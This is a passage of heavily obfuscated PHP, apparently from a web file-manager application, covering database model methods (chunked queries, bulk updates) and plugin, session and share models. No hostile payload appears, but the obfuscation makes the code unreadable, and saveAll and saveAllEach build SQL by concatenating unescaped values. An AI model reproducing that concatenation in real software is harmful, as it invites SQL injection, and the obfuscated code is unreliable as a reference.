$ö²ãŸŠÍ))->addAll($Ëë¹’, array(), !0); CacheLock::unlock($Ğ“”»); return !0; } public function metaGet($±ìùºçç, $íØâê“· = false) { $ËºßÙÛÂ =& $_SERVER[ˆûùúÊ¯]; if (!$this->tableMeta) { return array(); } $–ËŞõöõ = $this->tableMeta[$ËºßÙÛÂ[423]]; $µå‡ŸĞî = Model($this->tableMeta[$ËºßÙÛÂ[424]]); if ($íØâê“·) { $Ì·íÉ“ò = array($–ËŞõöõ => $±ìùºçç, $ËºßÙÛÂ[104] => $íØâê“·); return $µå‡ŸĞî->where($Ì·íÉ“ò)->getField($ËºßÙÛÂ[426]); } $Ì·íÉ“ò = array($–ËŞõöõ => $±ìùºçç); $Š…ÂËáÈ = $µå‡ŸĞî->field($ËºßÙÛÂ[428])->where($Ì·íÉ“ò)->select(); $Š…ÂËáÈ = array_to_keyvalue($Š…ÂËáÈ, $ËºßÙÛÂ[104], $ËºßÙÛÂ[426]); return $Š…ÂËáÈ; } private function checkDataAutoHas($ÏİóáŠ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $‡”³óô®) { if (in_array($ÏİóáŠ, explode($_SERVER[ˆûùúÊ¯][60], $‡”³óô®[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$í‡“¨ Í, $¹áÔ„øå) { $¯æ›àü =& $_SERVER[ˆûùúÊ¯]; if (!is_array($í‡“¨ Í)) { return; } foreach ($this->dataAuto as $×Ñùæ÷ú) { $ÙĞ­÷ïƒ = $×Ñùæ÷ú[0]; if (!in_array($¹áÔ„øå, explode($¯æ›àü[60], $×Ñùæ÷ú[2]))) { continue; } switch (trim($×Ñùæ÷ú[3])) { case $¯æ›àü[373]: case $¯æ›àü[374]: $Á§ë½ = $×Ñùæ÷ú[1]; $é‚ğÛ¢á = isset($×Ñùæ÷ú[4]) ? (array) $×Ñùæ÷ú[4] : array(); if ($Á§ë½ == $¯æ›àü[203] && array_key_exists($ÙĞ­÷ïƒ, $í‡“¨ Í)) { if (!$í‡“¨ Í[$ÙĞ­÷ïƒ]) { unset($í‡“¨ Í[$ÙĞ­÷ïƒ]); } break; } if (isset($í‡“¨ Í[$ÙĞ­÷ïƒ])) { array_unshift($é‚ğÛ¢á, $í‡“¨ Í[$ÙĞ­÷ïƒ]); } if ($¯æ›àü[373] == $×Ñùæ÷ú[3]) { $í‡“¨ Í[$ÙĞ­÷ïƒ] = call_user_func_array($Á§ë½, $é‚ğÛ¢á); } else { $í‡“¨ Í[$ÙĞ­÷ïƒ] = call_user_func_array(array(&$this, $Á§ë½), $é‚ğÛ¢á); } break; case $¯æ›àü[322]: if (isset($í‡“¨ Í[$ÙĞ­÷ïƒ]) && $í‡“¨ Í[$ÙĞ­÷ïƒ]) { $í‡“¨ Í[$ÙĞ­÷ïƒ] = call_user_func_array(array(&$this, $×Ñùæ÷ú[1]), array($í‡“¨ Í[$ÙĞ­÷ïƒ])); } break; case $¯æ›àü[325]: $í‡“¨ Í[$ÙĞ­÷ïƒ] = $í‡“¨ Í[$×Ñùæ÷ú[1]]; break; case $¯æ›àü[346]: if (isset($í‡“¨ Í[$ÙĞ­÷ïƒ]) && !is_string($í‡“¨ Í[$ÙĞ­÷ïƒ])) { $í‡“¨ Í[$ÙĞ­÷ïƒ] = json_encode_force($í‡“¨ Í[$ÙĞ­÷ïƒ]); } break; case $¯æ›àü[375]: if ($í‡“¨ Í[$ÙĞ­÷ïƒ] === $¯æ›àü[12]) { unset($í‡“¨ Í[$ÙĞ­÷ïƒ]); } break; case $¯æ›àü[376]: $í‡“¨ Í[$ÙĞ­÷ïƒ] = $×Ñùæ÷ú[1]; default: break; } } if ($¹áÔ„øå == $¯æ›àü[407]) { $çåÏÉ´ = strtolower($this->db->getDbType()); if (strpos($çåÏÉ´, $¯æ›àü[23]) !== 0) { return; } $ËÏÂò´Ş = $this->field(!0)->fields; $ÊÊ™òÑó = $ËÏÂò´Ş[$¯æ›àü[304]]; if (isset($ËÏÂò´Ş[$¯æ›àü[303]])) { unset($ÊÊ™òÑó[$ËÏÂò´Ş[$¯æ›àü[303]]]); } foreach ($ÊÊ™òÑó as $âËâÜÕÈ => $¹áÔ„øå) { if (!isset($í‡“¨ Í[$âËâÜÕÈ])) { $í‡“¨ Í[$âËâÜÕÈ] = $¯æ›àü[12]; } } } } private function dataAfterFilter(&$Š‘¨ıÄ¿) { $‹“´’çÚ =& $_SERVER[ˆûùúÊ¯]; foreach ($this->dataAuto as $õî¬–‡è) { $‘Â¨óŸ¡ = $õî¬–‡è[0]; if (!isset($Š‘¨ıÄ¿[$‘Â¨óŸ¡])) { continue; } if (!in_array($‹“´’çÚ[409], explode($‹“´’çÚ[60], $õî¬–‡è[2]))) { continue; } switch (trim($õî¬–‡è[3])) { case $‹“´’çÚ[373]: case $‹“´’çÚ[374]: $ÑÍšØë³ = isset($õî¬–‡è[4]) ? (array) $õî¬–‡è[4] : array(); array_unshift($ÑÍšØë³, $Š‘¨ıÄ¿[$‘Â¨óŸ¡]); if (isset($õî¬–‡è[4]) && $õî¬–‡è[4] == $‹“´’çÚ[429]) { $ÑÍšØë³ = array($Š‘¨ıÄ¿[$‘Â¨óŸ¡]); } if ($‹“´’çÚ[373] == $õî¬–‡è[3]) { $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = call_user_func_array($õî¬–‡è[1], $ÑÍšØë³); } else { $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = call_user_func_array(array(&$this, $õî¬–‡è[1]), $ÑÍšØë³); } break; case $‹“´’çÚ[322]: if (isset($Š‘¨ıÄ¿[$‘Â¨óŸ¡]) && $Š‘¨ıÄ¿[$‘Â¨óŸ¡]) { $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = call_user_func_array(array(&$this, $õî¬–‡è[1]), array($Š‘¨ıÄ¿[$‘Â¨óŸ¡])); } break; case $‹“´’çÚ[325]: $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = $Š‘¨ıÄ¿[$õî¬–‡è[1]]; break; case $‹“´’çÚ[346]: $¤ê’‰ğ¸ = $Š‘¨ıÄ¿[$‘Â¨óŸ¡]; $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = json_decode($¤ê’‰ğ¸, !0); if (is_null($Š‘¨ıÄ¿[$‘Â¨óŸ¡])) { $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = $¤ê’‰ğ¸; } break; case $‹“´’çÚ[375]: if ($Š‘¨ıÄ¿[$‘Â¨óŸ¡] === $‹“´’çÚ[12]) { unset($Š‘¨ıÄ¿[$‘Â¨óŸ¡]); } break; case $‹“´’çÚ[376]: $Š‘¨ıÄ¿[$‘Â¨óŸ¡] = $õî¬–‡è[1]; break; default: break; } } } public function saveAll($ûà”¨) { $¢¯í†Í =& $_SERVER[ˆûùúÊ¯]; $¥œ“áÑ = $this->tablePrefix . $this->tableName; $Ñûœû… = self::SQL_WHERE_IN_CHUNK; $ûà”¨ = is_array($ûà”¨) ? $ûà”¨ : array(); $œÏ­ = $¢¯í†Í[430]; $¸¥¶¢ª = 0; $Ô»­À‡Ä = array(); $ÖÍÃ¬¤º = count($ûà”¨); for ($µÅ®Á„ = 0; $µÅ®Á„ < $ÖÍÃ¬¤º; $µÅ®Á„++) { $½ åƒï¶ = $ûà”¨[$µÅ®Á„]; if (!is_array($½ åƒï¶) || count($½ åƒï¶) != 4) { continue; } $‘ü¼Êâ› = "\x55\120\x44\x41\124\x45\40\x60{$¥œ“áÑ}\140\40\x53\x45\x54\40{$½ åƒï¶[2]}\x20\75\40\x43\x41\123\105\40{$½ åƒï¶[0]}\40\xa"; if ($¸¥¶¢ª == 0) { $œÏ­ = $‘ü¼Êâ›; } $Ô»­À‡Ä[] = $¢¯í†Í[128] . $½ åƒï¶[1] . $¢¯í†Í[128]; $¸¥¶¢ª++; $œÏ­ .= "\x20\127\110\105\116\40\x27{$½ åƒï¶[1]}\x27\40\124\110\x45\116\x20\47{$½ åƒï¶[3]}\47\40\12"; if ($¸¥¶¢ª == $Ñûœû… || $µÅ®Á„ == $ÖÍÃ¬¤º - 1) { $· ‰¼–¸ = implode($¢¯í†Í[60], $Ô»­À‡Ä); $œÏ­ .= "\x20\x45\116\x44\x20\x20\127\x48\105\122\105\40{$½ åƒï¶[0]}\x20\111\x4e\40\x28{$· ‰¼–¸}\51\40"; $this->execute($œÏ­); $¸¥¶¢ª = 0; $œÏ­ = $‘ü¼Êâ›; $this->chunkEventCheck(count($Ô»­À‡Ä)); $Ô»­À‡Ä = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÍÒ„‡‘) { $—’æşÎ =& $_SERVER[ˆûùúÊ¯]; $“ÎŠÁ’Æ = $this->tablePrefix . $this->tableName; foreach ($ÍÒ„‡‘ as $âÆ‘”–Ï) { if (!is_array($âÆ‘”–Ï) || count($âÆ‘”–Ï) != 4) { continue; } $Ö÷ÍØ = $âÆ‘”–Ï[0] . $—’æşÎ[431] . $âÆ‘”–Ï[1] . $—’æşÎ[128]; $ÔÛ‘ëõë = $âÆ‘”–Ï[2] . $—’æşÎ[431] . $âÆ‘”–Ï[3] . $—’æşÎ[128]; $¨€Äæœ = "\x75\160\x64\141\x74\x65\x20{$“ÎŠÁ’Æ}\40\x73\145\x74\40{$ÔÛ‘ëõë}\40\167\150\x65\162\x65\x20{$Ö÷ÍØ}\x3b"; $this->execute($¨€Äæœ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ôàæâ“ = false, $Íö¦“é” = false) { $this->_chunkEvent = $Ôàæâ“; $this->_chunkEventParam = $Íö¦“é”; } private function chunkEventCheck($†Ôƒì¯Ş) { if (!$this->_chunkEvent) { return; } $ÄËË = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ÄËË[$_SERVER[ˆûùúÊ¯][432]] = $†Ôƒì¯Ş; Hook::trigger($this->_chunkEvent, $ÄËË); } public function addAll($Ó·Áû¦š, $œ­–Ô¸ = array(), $åÍîşª = false) { $ô·ºÜ›Ô =& $_SERVER[ˆûùúÊ¯]; ignore_timeout(); $Ì¬Ãå©¶ = self::SQL_WHERE_IN_CHUNK; if (empty($Ó·Áû¦š)) { $this->error = think_lang($ô·ºÜ›Ô[323]); return !1; } $œ­–Ô¸ = $this->_parseOptions($œ­–Ô¸); foreach ($Ó·Áû¦š as $»¡×¼ñâ => $¶Êè) { $Ó·Áû¦š[$»¡×¼ñâ] = $this->_facade($¶Êè); $this->_beforeInsert($Ó·Áû¦š[$»¡×¼ñâ], $œ­–Ô¸); } if (method_exists($this->db, $ô·ºÜ›Ô[324])) { for ($æŸÜº­É = 0; $æŸÜº­É < count($Ó·Áû¦š); $æŸÜº­É += $Ì¬Ãå©¶) { $Ú¶××·Ö = array_slice($Ó·Áû¦š, $æŸÜº­É, $Ì¬Ãå©¶); if (!is_array($Ú¶××·Ö) || count($Ú¶××·Ö) == 0) { break; } $¦í¢£…¤ = $this->db->insertAll($Ú¶××·Ö, $œ­–Ô¸, $åÍîşª); $this->chunkEventCheck(count($Ú¶××·Ö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ó·Áû¦š as $»¡×¼ñâ => $¶Êè) { $¦í¢£…¤ = $this->db->insert($¶Êè, $œ­–Ô¸, $åÍîşª); } $this->commit(); } if (!1 !== $¦í¢£…¤) { $èì×‰Å– = $this->getLastInsID(); if ($èì×‰Å–) { return $èì×‰Å–; } } return $¦í¢£…¤; } public function save($Ú¯å¶¶… = '', $‡¾Õõ¬ = array()) { $Úä¸µ± =& $_SERVER[ˆûùúÊ¯]; $àÊ†Òİ = self::SQL_WHERE_IN_CHUNK; $ÁÒİÄ‰ä = $this->optionsValue(); $ üò†Ó = $this->findWhereField($ÁÒİÄ‰ä); if (!$ üò†Ó) { return parent::save($Ú¯å¶¶…, $‡¾Õõ¬); } $òû¬Å¼¶ = 0; $‡ìˆÈÔé = $ÁÒİÄ‰ä[$Úä¸µ±[327]][$ üò†Ó][1]; $‡ìˆÈÔé = is_array($‡ìˆÈÔé) ? $‡ìˆÈÔé : array(); $¦±Ğ€ï¾ = count($‡ìˆÈÔé); for ($ÒÜº³©Û = 0; $ÒÜº³©Û < $¦±Ğ€ï¾; $ÒÜº³©Û += $àÊ†Òİ) { $ÏÆ“™éÃ = array_slice($‡ìˆÈÔé, $ÒÜº³©Û, $àÊ†Òİ); if (!is_array($ÏÆ“™éÃ) || count($ÏÆ“™éÃ) == 0) { break; } $ÁÒİÄ‰ä[$Úä¸µ±[327]][$ üò†Ó][1] = $ÏÆ“™éÃ; $this->optionsValue($ÁÒİÄ‰ä); $òû¬Å¼¶ += parent::save($Ú¯å¶¶…, $‡¾Õõ¬); $this->chunkEventCheck(count($ÏÆ“™éÃ)); } $this->chunkEventSet(); return $òû¬Å¼¶; } public function add($‰‰‚€ƒ = '', $úığ¯Ôó = array(), $µ‘Ëƒß§ = false) { if ($this->addTaskStatus && is_array($‰‰‚€ƒ)) { $this->addTaskData[] = $‰‰‚€ƒ; return; } return parent::add($‰‰‚€ƒ, $úığ¯Ôó, $µ‘Ëƒß§); } public function parseWhereLike($‚ í”¨°, $€šª©ˆ² = '', $ò–Ù‡îô = false, &$ğ¾’¿Ùş = false) { $å³Ñ’Šş =& $_SERVER[ˆûùúÊ¯]; $İ“ÚÔ‰Ó = $GLOBALS[$å³Ñ’Šş[6]][$å³Ñ’Šş[433]]; if (!$İ“ÚÔ‰Ó[$å³Ñ’Šş[434]]) { return $‚ í”¨°; } if (!is_array($‚ í”¨°)) { return $‚ í”¨°; } $õì¹Ñ› = array(); $÷¬”éªÙ = 0; foreach ($‚ í”¨° as $Ïï´– => $ÁÙÚ½ÙÆ) { if (is_array($ÁÙÚ½ÙÆ) && count($ÁÙÚ½ÙÆ) == 2 && $ÁÙÚ½ÙÆ[0] == $å³Ñ’Šş[435] && is_string($ÁÙÚ½ÙÆ[1]) && substr($ÁÙÚ½ÙÆ[1], 0, 1) == $å³Ñ’Šş[436] && substr($ÁÙÚ½ÙÆ[1], strlen($ÁÙÚ½ÙÆ[1]) - 1, 1) == $å³Ñ’Šş[436]) { $ğ¾’¿Ùş = !0; $Ö­Î›äİ = is_string($Ïï´–) ? $Ïï´– : $€šª©ˆ²; $Ğ¢¯—øò = substr($ÁÙÚ½ÙÆ[1], 1, strlen($ÁÙÚ½ÙÆ[1]) - 2); $Ğ¢¯—øò = $this->db->escapeString($Ğ¢¯—øò); if (!strpos($Ö­Î›äİ, $å³Ñ’Šş[10])) { $Ö­Î›äİ = $å³Ñ’Šş[437] . $Ö­Î›äİ . $å³Ñ’Šş[437]; } $™ƒ²¯‹ƒ = $å³Ñ’Šş[212] . $Ğ¢¯—øò . $å³Ñ’Šş[212]; $Ğ¢¯—øò = str_replace(array($å³Ñ’Šş[10], $å³Ñ’Šş[438], $å³Ñ’Šş[11]), $å³Ñ’Šş[439], $Ğ¢¯—øò); if ($İ“ÚÔ‰Ó[$å³Ñ’Šş[440]]) { $™ƒ²¯‹ƒ = $å³Ñ’Šş[441] . $Ğ¢¯—øò . $å³Ñ’Šş[442]; if ($İ“ÚÔ‰Ó[$å³Ñ’Šş[443]]) { $™ƒ²¯‹ƒ = $å³Ñ’Šş[442] . $Ğ¢¯—øò . $å³Ñ’Šş[441]; } } $õì¹Ñ›[$÷¬”éªÙ] = $å³Ñ’Šş[444] . $Ö­Î›äİ . $å³Ñ’Šş[445] . $™ƒ²¯‹ƒ . $å³Ñ’Šş[446]; $÷¬”éªÙ++; continue; } if (is_array($ÁÙÚ½ÙÆ)) { $€šª©ˆ² = is_string($Ïï´–) ? $Ïï´– : $€šª©ˆ²; $ÁÙÚ½ÙÆ = $this->parseWhereLike($ÁÙÚ½ÙÆ, $€šª©ˆ², !0, $ğ¾’¿Ùş); } if (is_numeric($Ïï´–)) { $õì¹Ñ›[$÷¬”éªÙ] = $ÁÙÚ½ÙÆ; $÷¬”éªÙ++; } else { $õì¹Ñ›[$Ïï´–] = $ÁÙÚ½ÙÆ; } } if ($ğ¾’¿Ùş && !$ò–Ù‡îô) { } return $õì¹Ñ›; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($şô­†×Û = array()) { $¯ÑìŞîÄ =& $_SERVER[ˆûùúÊ¯]; $¨îüÛ¸Æ = self::SQL_WHERE_IN_CHUNK; $£…¼ÔƒÁ = $this->optionsValue(); $Ò¥î†’ì = $this->findWhereField($£…¼ÔƒÁ); if (!$Ò¥î†’ì || isset($£…¼ÔƒÁ[$¯ÑìŞîÄ[344]]) || isset($£…¼ÔƒÁ[$¯ÑìŞîÄ[405]])) { return parent::select($şô­†×Û); } $İëº¹ = $£…¼ÔƒÁ[$¯ÑìŞîÄ[327]][$Ò¥î†’ì][1]; $İëº¹ = is_array($İëº¹) ? $İëº¹ : array(); $º€ÓÍş” = null; for ($Ó­°²ü  = 0; $Ó­°²ü  < count($İëº¹); $Ó­°²ü  += $¨îüÛ¸Æ) { $—Î”àÂÁ = array_slice($İëº¹, $Ó­°²ü , $¨îüÛ¸Æ); if (!is_array($—Î”àÂÁ) || count($—Î”àÂÁ) == 0) { break; } $£…¼ÔƒÁ[$¯ÑìŞîÄ[327]][$Ò¥î†’ì][1] = $—Î”àÂÁ; $this->optionsValue($£…¼ÔƒÁ); $äÉ‰Œà¶ = parent::select($şô­†×Û); if (!$äÉ‰Œà¶) { continue; } $º€ÓÍş” = is_array($º€ÓÍş”) ? $º€ÓÍş” : array(); $º€ÓÍş” = array_merge($º€ÓÍş”, $äÉ‰Œà¶); } return $º€ÓÍş”; } public function delete($©ò¼ØÔ = array()) { $…æ¤ñì =& $_SERVER[ˆûùúÊ¯]; $ö‹êé¹Ğ = self::SQL_WHERE_IN_CHUNK; $á¸ë¦ò˜ = $this->optionsValue(); $ß•´ıãâ = $this->findWhereField($á¸ë¦ò˜); if (!$ß•´ıãâ) { return parent::delete($©ò¼ØÔ); } $Š‰ôÎ²Š = 0; $Éâ¼òş = $á¸ë¦ò˜[$…æ¤ñì[327]][$ß•´ıãâ][1]; $Éâ¼òş = is_array($Éâ¼òş) ? $Éâ¼òş : array(); for ($ó ßÁÌÑ = 0; $ó ßÁÌÑ < count($Éâ¼òş); $ó ßÁÌÑ += $ö‹êé¹Ğ) { $§ò”äé = array_slice($Éâ¼òş, $ó ßÁÌÑ, $ö‹êé¹Ğ); if (!is_array($§ò”äé) || count($§ò”äé) == 0) { break; } $á¸ë¦ò˜[$…æ¤ñì[327]][$ß•´ıãâ][1] = $§ò”äé; $this->optionsValue($á¸ë¦ò˜); $Š‰ôÎ²Š += parent::delete($©ò¼ØÔ); } return $Š‰ôÎ²Š; } private function findWhereField($Üº¿üì¯) { $á€ŠßÓ© =& $_SERVER[ˆûùúÊ¯]; $½ãÜîÙ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Üº¿üì¯) || !is_array($Üº¿üì¯[$á€ŠßÓ©[327]])) { return !1; } foreach ($Üº¿üì¯[$á€ŠßÓ©[327]] as $ì¨Çú½º => $¼™Áß‹) { if (is_array($¼™Áß‹) && isset($¼™Áß‹[0]) && is_string($¼™Áß‹[0]) && strtolower($¼™Áß‹[0]) == $á€ŠßÓ©[7] && is_array($¼™Áß‹[1]) && count($¼™Áß‹[1]) > $½ãÜîÙ) { ignore_timeout(); return $ì¨Çú½º; } } return !1; } public function setMasterDB($ãõÛ±­Ï = true) { think_config($_SERVER[ˆûùúÊ¯][447], $ãõÛ±­Ï); } } goto Bøò¾«¿¸â; dæ»ùŠèšŠ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\160\x6c\x75\147\x69\156\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\163\164\x61\x74\x75\163", "\162\x65\x67\x69\x65\x73\x74", "\143\x6f\156\146\x69\x67"); public function loadList($×«×ÅÚØ = false) { $Ñ¥ŞÕö = array_to_keyvalue($this->listData(), $_SERVER[ˆûùúÊ¯][42]); if ($×«×ÅÚØ) { return $Ñ¥ŞÕö[$×«×ÅÚØ]; } return $Ñ¥ŞÕö; } public function init() { $¬¦„àë¡ =& $_SERVER[ˆûùúÊ¯]; Hook::trigger($¬¦„àë¡[2016]); $¢‡Ñ—¯¹ = $this->loadPluginList(); foreach ($¢‡Ñ—¯¹ as $ã¾ãşÚ => $›«æŞºÖ) { $ø³¡ôĞñ = $this->appAllow($ã¾ãşÚ, $›«æŞºÖ); if (!$ø³¡ôĞñ) { continue; } foreach ($›«æŞºÖ[$¬¦„àë¡[2017]] as $ºÂÈ†êÓ => $¿“ÕÈ‹) { Hook::bind($ºÂÈ†êÓ, $¿“ÕÈ‹); } } Hook::trigger($¬¦„àë¡[2018]); Hook::trigger(ACTION); } public function appAllow($ÙßµÉÜŒ, $õØ÷µÏû, $Ş—ŞóÀ = true) { $ÖÖüÕ»Ş =& $_SERVER[ˆûùúÊ¯]; $íÁó¡Ô = PLUGIN_DIR . $ÙßµÉÜŒ . $ÖÖüÕ»Ş[2019]; if (!is_array($õØ÷µÏû) || !is_array($õØ÷µÏû[$ÖÖüÕ»Ş[2017]]) || $õØ÷µÏû[$ÖÖüÕ»Ş[810]] != 1 || !is_file($íÁó¡Ô)) { return !1; } if ($GLOBALS[$ÖÖüÕ»Ş[544]] == 1) { if ($GLOBALS[$ÖÖüÕ»Ş[6]][$ÖÖüÕ»Ş[2020]] || !$GLOBALS[$ÖÖüÕ»Ş[6]][$ÖÖüÕ»Ş[2021]]) { return !0; } $¥—Ò²Ñş = explode($ÖÖüÕ»Ş[60], strtolower($GLOBALS[$ÖÖüÕ»Ş[6]][$ÖÖüÕ»Ş[2021]])); return in_array(strtolower($ÙßµÉÜŒ), $¥—Ò²Ñş) ? !1 : !0; } if ($Ş—ŞóÀ && !Action($ÖÖüÕ»Ş[2022])->checkAuth($ÙßµÉÜŒ)) { return !1; } return !0; } public function unInstall($ø¤êµİİ) { $–¡úÈÁ÷ =& $_SERVER[ˆûùúÊ¯]; $Ğ°€Òâ“ = $this->loadList($ø¤êµİİ); if (file_exists(PLUGIN_DIR . $ø¤êµİİ)) { Hook::apply($ø¤êµİİ . $–¡úÈÁ÷[2023]); } $this->remove($Ğ°€Òâ“[$–¡úÈÁ÷[451]]); } public function changeStatus($æ×ê®ÁÇ, $ı÷â¨î) { $Ûéîõ»ö =& $_SERVER[ˆûùúÊ¯]; $©¥¢à§Â = $this->loadList($æ×ê®ÁÇ); if ($ı÷â¨î) { Hook::apply($æ×ê®ÁÇ . $Ûéîõ»ö[2024]); } $this->update($©¥¢à§Â[$Ûéîõ»ö[451]], array($Ûéîõ»ö[2025] => $ı÷â¨î)); } public function appRegist($Ï‚ã˜Ò, $´¿ÕÕË) { $“Š¼Ÿ£È =& $_SERVER[ˆûùúÊ¯]; $áêäºË = $this->loadList($Ï‚ã˜Ò); if ($áêäºË) { $this->update($áêäºË[$“Š¼Ÿ£È[451]], array($“Š¼Ÿ£È[2017] => $´¿ÕÕË)); } else { $ûÄúïÁö = array($“Š¼Ÿ£È[42] => $Ï‚ã˜Ò, $“Š¼Ÿ£È[2017] => $´¿ÕÕË, $“Š¼Ÿ£È[810] => 0, $“Š¼Ÿ£È[6] => $this->getConfigDefault($Ï‚ã˜Ò)); $this->insert($ûÄúïÁö); } } public function getConfigDefault($î—‹¹÷¥) { $˜ÄÛâ³ =& $_SERVER[ˆûùúÊ¯]; $¥ˆêÓò¢ = array(); $äø–™¹Û = $this->getPackageJson($î—‹¹÷¥); if (!$äø–™¹Û && is_array($äø–™¹Û[$˜ÄÛâ³[2026]])) { return $¥ˆêÓò¢; } foreach ($äø–™¹Û[$˜ÄÛâ³[2026]] as $äŸÈ®Ô• => $™Œ†‘”) { if (!isset($™Œ†‘”[$˜ÄÛâ³[426]]) || isset($¥ˆêÓò¢[$äŸÈ®Ô•])) { continue; } $¥ˆêÓò¢[$äŸÈ®Ô•] = $™Œ†‘”[$˜ÄÛâ³[426]]; } return $¥ˆêÓò¢; } public function getPackageJson($á€¤Õñ) { return Hook::apply($á€¤Õñ . $_SERVER[ˆûùúÊ¯][2027]); } public function getConfig($Œ‚±ÁÄğ, $¦õ­àè— = false) { $“¾ò– =& $_SERVER[ˆûùúÊ¯]; $¡¶™ÖöÚ = array(); $ş¤´‡…» = $this->loadList($Œ‚±ÁÄğ); if ($ş¤´‡…» && is_array($ş¤´‡…»[$“¾ò–[6]])) { $¡¶™ÖöÚ = $ş¤´‡…»[$“¾ò–[6]]; } if (!$¡¶™ÖöÚ || $¦õ­àè—) { $¡¶™ÖöÚ = $this->getConfigDefault($Œ‚±ÁÄğ); } return $¡¶™ÖöÚ; } public function setConfig($üÖıä®Í, $ö¼ÈÃà = false) { $Œøçâ¿¤ =& $_SERVER[ˆûùúÊ¯]; $±ÉØßÀ’ = $this->loadList($üÖıä®Í); if (!$±ÉØßÀ’) { return !1; } $Ñ¸ÓĞ”Š = $±ÉØßÀ’[$Œøçâ¿¤[6]]; if ($ö¼ÈÃà == !1) { $Ñ¸ÓĞ”Š = array(); $ö¼ÈÃà = $this->getConfigDefault($üÖıä®Í); } foreach ($ö¼ÈÃà as $â«¢€ñ => $İ‡ô”ù) { $Ñ¸ÓĞ”Š[$â«¢€ñ] = is_string($İ‡ô”ù) ? trim($İ‡ô”ù) : $İ‡ô”ù; } $this->update($±ÉØßÀ’[$Œøçâ¿¤[451]], array($Œøçâ¿¤[6] => $Ñ¸ÓĞ”Š)); } public function viewList() { $“ëÑËªÏ =& $_SERVER[ˆûùúÊ¯]; $äĞ³ƒæ‹ = $this->loadList(); $this->pluginScan($äĞ³ƒæ‹); $äĞ³ƒæ‹ = $this->loadPluginList(); $¯‰€ĞÙ = array(); foreach ($äĞ³ƒæ‹ as $ÆÚÙæÌè => $¬³ûÇ¨å) { unset($¬³ûÇ¨å[$“ëÑËªÏ[2017]], $¬³ûÇ¨å[$“ëÑËªÏ[6]]); $Ş´·ó²¤ = PLUGIN_DIR . $¬³ûÇ¨å[$“ëÑËªÏ[42]] . $“ëÑËªÏ[2019]; if (!is_file($Ş´·ó²¤)) { continue; } $©…Îºø = Hook::apply($¬³ûÇ¨å[$“ëÑËªÏ[42]] . $“ëÑËªÏ[2027]); if (is_array($©…Îºø)) { $¯‰€ĞÙ[$ÆÚÙæÌè] = array_merge($¬³ûÇ¨å, $©…Îºø); } } return $¯‰€ĞÙ; } private function loadPluginList() { $£ë¨úÄ =& $_SERVER[ˆûùúÊ¯]; $²ÀÕà½æ = $this->loadList(); if (strtolower(MOD) == $£ë¨úÄ[2028]) { return $²ÀÕà½æ; } $‘ÈŞè”€ = Hook::trigger($£ë¨úÄ[2029], $²ÀÕà½æ); if ($²ÀÕà½æ && !$‘ÈŞè”€) { die; } return $‘ÈŞè”€ ? $‘ÈŞè”€ : $²ÀÕà½æ; } private function pluginScan($Ì¯›ßö´) { $ÆÒÌèÄ¨ =& $_SERVER[ˆûùúÊ¯]; recursion_dir(PLUGIN_DIR, $ãñ•É×, $¦ÛŸøŸŠ, 0); foreach ($ãñ•É× as $÷´Å¨‰”) { $À”Ù´¨ = get_path_this($÷´Å¨‰”); if (isset($Ì¯›ßö´[$À”Ù´¨]) || !file_exists($÷´Å¨‰” . $ÆÒÌèÄ¨[2030]) || !file_exists($÷´Å¨‰” . $ÆÒÌèÄ¨[2019])) { continue; } Hook::apply($À”Ù´¨ . $ÆÒÌèÄ¨[2024]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x73\145\x73\x73\x69\x6f\156"; public function get($Ú‹ü·ŠÀ) { $çÇÅ¬‹Ã =& $_SERVER[ˆûùúÊ¯]; $•ù£áÚï = $this->where(array($çÇÅ¬‹Ã[2031] => $Ú‹ü·ŠÀ))->find(); if (!is_array($•ù£áÚï)) { return !1; } return $•ù£áÚï[$çÇÅ¬‹Ã[814]]; } public function set($ÉÍÜŒÂ, $Å¦¨‡åÊ, $ğ‹«Å÷ı = 3600) { $†ˆËŸ± =& $_SERVER[ˆûùúÊ¯]; $œê™®Ó = array($†ˆËŸ±[2031] => $ÉÍÜŒÂ, $†ˆËŸ±[1935] => $Å¦¨‡åÊ, $†ˆËŸ±[2032] => $ğ‹«Å÷ı + time()); if (Session::get($†ˆËŸ±[2033])) { $œê™®Ó[$†ˆËŸ±[1704]] = Session::get($†ˆËŸ±[2033]); } else { $œê™®Ó[$†ˆËŸ±[1704]] = 0; } if ($this->get($ÉÍÜŒÂ)) { return $this->where(array($†ˆËŸ±[2031] => $ÉÍÜŒÂ))->save($œê™®Ó); } else { return $this->add($œê™®Ó, array(), !0); } } public function remove($’•Ô·ˆ«) { return $this->where(array($_SERVER[ˆûùúÊ¯][2031] => $’•Ô·ˆ«))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ˆûùúÊ¯][2034] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\151\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\x72\164\x2c\x75\160\x64\x61\164\x65", "\x66\x75\x6e\x63\164\151\x6f\156"), array("\143\x72\145\141\x74\x65\124\151\155\145", "\164\151\155\145", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x6f\x70\x74\151\x6f\x6e\163", '', "\151\x6e\163\145\x72\164\x2c\x75\x70\144\x61\164\145\54\x73\x65\154\145\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function 